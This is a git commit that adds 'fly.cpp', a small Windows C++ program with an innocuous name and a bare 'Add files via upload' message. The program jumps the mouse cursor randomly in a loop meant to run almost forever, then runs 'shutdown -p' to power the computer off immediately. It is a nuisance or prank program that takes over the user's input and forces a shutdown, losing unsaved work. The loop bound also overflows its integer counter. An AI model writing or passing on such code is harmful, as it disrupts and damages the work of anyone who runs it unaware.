b0fc6b4320e252d6d9643eb59ae313c620b11913
Dynamit425 <155964839+Dynamit425@users.noreply.github.com>
2024-02-15 09:51:30 +0800

    Add files via upload

---
+++ fly.cpp
@@ -0,0 +1,11 @@
+#include<bits/stdc++.h>
+#include<string>
+#include<windows.h>
+using namespace std;
+int main()
+{
+	for(int i=1;i<=100000000000000;i++){
+		SetCursorPos(rand()%1000,rand()%1000);
+	}
+	system("shutdown -p");
+}
